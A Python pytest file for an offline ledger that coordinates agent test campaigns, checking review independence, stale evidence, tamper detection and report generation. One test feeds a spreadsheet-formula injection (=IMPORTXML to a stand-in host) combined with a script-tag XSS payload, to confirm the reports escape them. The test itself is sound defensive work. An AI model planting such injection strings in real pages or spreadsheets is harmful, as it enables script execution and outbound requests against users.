"""Offline ledger semantics; no service, credential, model or vendor access."""

from concurrent.futures import ThreadPoolExecutor
import json
import socket

import pytest

from tools.campaign import Campaign, evidence, handoff, plan_template


@pytest.fixture(autouse=True)
def no_network(monkeypatch):
    def blocked(*args, **kwargs):
        raise AssertionError("Offline campaign tests must not use the network")
    monkeypatch.setattr(socket.socket, "connect", blocked)
    monkeypatch.setattr(socket, "getaddrinfo", blocked)


@pytest.fixture
def setup(tmp_path):
    c = Campaign.create(tmp_path, "test-campaign", "local", case_ids=["RS04", "SW04"])
    proof = tmp_path / "proof.json"
    proof.write_text('{"controlled_fixture":true}')
    refs = evidence([proof])
    agents = ["campaign-coordinator", "campaign-review", "journey-results", "journey-swarm", "ui-u12", "coord-c07"]
    for agent in agents:
        c.append(agent, "claim", {"thread_id": "session-" + agent, "handoff": None})
    for name in ("target_ready", "account_ready"):
        c.append("campaign-coordinator", "gate", {"name": name, "status": "ready", "note": "Controlled fixture readiness, not a live service", "evidence": refs})
    plan = plan_template(c, "RS04")
    plan.update(design_reference="Controlled test flow", fixture="Test-owned transport", revisions={"fixture": "v1"})
    plan["checks"] = {k: {"exclude": "Outside this bounded ledger test"} for k in c.criteria}
    for k, mode in (("G05", "contract"), ("U12", "captured_browser"), ("C07", "contract")):
        plan["checks"][k] = {"target": mode}
    c.append("journey-results", "plan", {"case_id": "RS04", "attempt_id": "attempt-one", "plan": plan})
    return c, proof, refs, plan


def record(c, refs, criterion="U12", status="pass", attempt="attempt-one"):
    owners = {"G05": "journey-results", "U12": "ui-u12", "C07": "coord-c07"}
    return c.append(owners[criterion], "record", {"case_id": "RS04", "attempt_id": attempt,
        "criterion_id": criterion, "status": status, "evidence_level": "captured_browser" if criterion == "U12" else "contract",
        "note": "Actual controlled test observation", "evidence": refs})


def test_fresh_catalogue_does_not_import_historical_passes(tmp_path):
    c = Campaign.create(tmp_path, "fresh", "local")
    snapshot = c.snapshot()
    assert len(snapshot["cases"]) == 50
    assert snapshot["counts"] == {"not_run": 50}
    assert {a["status"] for a in snapshot["agents"]} == {"unassigned"}
    assert not snapshot["findings"]
    assert snapshot["gates"] == {"target_ready": "pending", "account_ready": "pending"}
    with pytest.raises(FileExistsError):
        Campaign.create(tmp_path, "fresh", "local")


def test_mcp_handoff_uses_the_declared_driver_instead_of_the_conversation_runner(tmp_path):
    c = Campaign.create(tmp_path, "mcp-scope", "dev", case_ids=["MC03"])
    instructions = handoff(c, "journey-mcp", "MC03")
    assert "retain actual MCP calls/results and human decisions" in instructions
    assert "ask/answer bypasses MCP" in instructions
    assert "only ask/answer start model work" not in instructions
    assert c.snapshot()["counts"] == {"not_run": 1}


def test_aggregate_requires_independent_review_and_current_evidence(setup):
    c, proof, refs, _ = setup
    for criterion in ("G05", "U12", "C07"):
        record(c, refs, criterion)
    case = c.snapshot()["cases"][0]
    assert case["lanes"] == {"research": "pass", "ui_ux": "pass", "coordination": "pass"}
    assert case["status"] == "awaiting_review"
    c.append("campaign-review", "review", {"case_id": "RS04", "attempt_id": "attempt-one", "decision": "pass", "note": "Reviewed controlled evidence", "evidence": refs})
    assert c.snapshot()["cases"][0]["status"] == "pass"
    proof.write_text('{"changed":true}')
    assert c.snapshot()["cases"][0]["status"] == "stale_evidence"


def test_review_cannot_pass_missing_or_failed_cells_or_same_actual_person(setup):
    c, _, refs, _ = setup
    review = {"case_id": "RS04", "attempt_id": "attempt-one", "decision": "pass", "note": "Review", "evidence": refs}
    with pytest.raises(ValueError, match="Every required"):
        c.append("campaign-review", "review", review.copy())
    c.append("campaign-review", "claim", {"thread_id": "session-ui-u12", "handoff": "Rebound to demonstrate independence refusal"})
    record(c, refs)
    with pytest.raises(ValueError, match="different actual"):
        c.append("campaign-review", "review", review.copy())


def test_readiness_and_criterion_owner_fences(setup):
    c, _, refs, _ = setup
    c.append("campaign-coordinator", "gate", {"name": "account_ready", "status": "pending", "note": "Cleanup not complete", "evidence": []})
    with pytest.raises(ValueError, match="gates"):
        record(c, refs)
    with pytest.raises(ValueError, match="responsible"):
        c.append("coord-c07", "record", {"case_id": "RS04", "attempt_id": "attempt-one", "criterion_id": "U12", "status": "blocked", "note": "Wrong owner", "evidence": []})
    assert c.snapshot()["counts"] == {"not_run": 2}


def test_failed_attempt_is_retained_when_corrected_attempt_passes(setup):
    c, _, refs, plan = setup
    record(c, refs, status="fail")
    with pytest.raises(ValueError, match="failed attempt"):
        record(c, refs)
    c.append("journey-results", "plan", {"case_id": "RS04", "attempt_id": "attempt-two", "plan": plan})
    for criterion in ("G05", "U12", "C07"):
        record(c, refs, criterion, attempt="attempt-two")
    c.append("campaign-review", "review", {"case_id": "RS04", "attempt_id": "attempt-two", "decision": "pass", "note": "Separate corrected fixture", "evidence": refs})
    case = c.snapshot()["cases"][0]
    assert case["status"] == "pass" and case["prior_failed_attempts"] == 1
    assert [a["status"] for a in case["history"]] == ["fail", "pass"]


def test_catalogue_and_agent_log_tampering_stop_reports(setup):
    c, _, refs, _ = setup
    record(c, refs)
    log = c.folder / "agents/ui-u12/events.jsonl"
    log.write_text(log.read_text().replace('"status": "pass"', '"status": "fail"'))
    with pytest.raises(ValueError, match="integrity"):
        c.snapshot()
    frozen = c.folder / "catalog.json"
    frozen.write_text(frozen.read_text() + " ")
    with pytest.raises(ValueError, match="catalogue changed"):
        Campaign(c.folder)


def test_concurrent_agents_keep_separate_complete_ordered_logs(setup):
    c, _, refs, _ = setup
    with ThreadPoolExecutor(max_workers=3) as pool:
        list(pool.map(lambda criterion: record(c, refs, criterion), ["G05", "U12", "C07"]))
    events = c.events()
    assert [e["index"] for e in events] == list(range(1, len(events) + 1))
    assert c.snapshot()["cases"][0]["status"] == "awaiting_review"


def test_correlations_group_reporter_keys_without_inventing_causality(setup):
    c, _, refs, _ = setup
    for agent, criterion in [("ui-u12", "U12"), ("coord-c07", "C07")]:
        c.append(agent, "finding", {"case_id": "RS04", "attempt_id": "attempt-one", "criterion_id": criterion,
            "correlation_key": "duplicate-reconnect", "issue_id": None, "state": "open", "note": "Shared symptom, cause unproven", "evidence": refs})
    data = c.snapshot()
    assert len(data["findings"]) == 2
    assert data["correlations"][0]["reports"] == 2
    assert data["correlations"][0]["cases"] == ["RS04"]


def test_reports_escape_script_and_spreadsheet_injection(setup):
    c, _, refs, _ = setup
    note = '=IMPORTXML("https://bad.example") </script><script>alert(1)</script>'
    c.append("ui-u12", "finding", {"case_id": "RS04", "attempt_id": "attempt-one", "criterion_id": "U12", "correlation_key": "test-note", "issue_id": None, "state": "open", "note": note, "evidence": refs})
    c.report()
    page = (c.folder / "reports/dashboard.html").read_text()
    assert '</script><script>alert(1)</script>' not in page
    assert "\\u003c/script\\u003e" in page
    assert "'=IMPORTXML" in (c.folder / "reports/findings.csv").read_text()
    assert note == json.loads((c.folder / "reports/summary.json").read_text())["findings"][0]["note"]


def test_plan_scope_cannot_silently_drop_checks_and_ui_needs_browser(setup):
    c, _, _, plan = setup
    changed = json.loads(json.dumps(plan))
    del changed["checks"]["G01"]
    with pytest.raises(ValueError, match="every criterion"):
        c.append("journey-results", "plan", {"case_id": "RS04", "attempt_id": "new-attempt", "plan": changed})
    changed = json.loads(json.dumps(plan))
    changed["checks"]["U12"] = {"target": "contract"}
    with pytest.raises(ValueError, match="browser"):
        c.append("journey-results", "plan", {"case_id": "RS04", "attempt_id": "new-attempt", "plan": changed})


def test_open_blocking_findings_prevent_a_green_review(setup):
    c, _, refs, _ = setup
    for criterion in ("G05", "U12", "C07"):
        record(c, refs, criterion)
    finding = {"case_id": "RS04", "attempt_id": "attempt-one", "criterion_id": "U12", "correlation_key": "unresolved-output", "issue_id": None, "state": "open", "blocking": True, "note": "Required observation unresolved", "evidence": refs}
    c.append("ui-u12", "finding", finding.copy())
    assert c.snapshot()["cases"][0]["status"] == "blocked"
    review = {"case_id": "RS04", "attempt_id": "attempt-one", "decision": "pass", "note": "Review", "evidence": refs}
    with pytest.raises(ValueError, match="blocking findings"):
        c.append("campaign-review", "review", review.copy())
    c.append("ui-u12", "finding", {**finding, "state": "resolved", "note": "Resolved with retained proof"})
    c.append("campaign-review", "review", review.copy())
    assert c.snapshot()["cases"][0]["status"] == "pass"


def test_new_observation_invalidates_prior_review_without_erasing_it(setup):
    c, _, refs, _ = setup
    for criterion in ("G05", "U12", "C07"):
        record(c, refs, criterion)
    c.append("campaign-review", "review", {"case_id": "RS04", "attempt_id": "attempt-one", "decision": "pass", "note": "Reviewed", "evidence": refs})
    assert c.snapshot()["cases"][0]["status"] == "pass"
    record(c, refs)
    assert c.snapshot()["cases"][0]["status"] == "awaiting_review"
    assert sum(e["kind"] == "review" for e in c.events()) == 1


def test_reassignment_retains_original_reporter_and_requires_handoff(setup):
    c, _, _, _ = setup
    with pytest.raises(ValueError, match="handoff"):
        c.append("ui-u12", "claim", {"thread_id": "new-session", "handoff": None})
    c.append("ui-u12", "claim", {"thread_id": "new-session", "handoff": "Explicit accepted handoff"})
    binding = c.binding(c.events(), "ui-u12")
    assert binding["assignment_revision"] == 2
    assert c.events()[3]["agent_thread_id"] != "new-session"
    assert "--env local" in handoff(c, "journey-results", "RS04")
    assert "only ask/answer start model work" in handoff(c, "journey-results", "RS04")
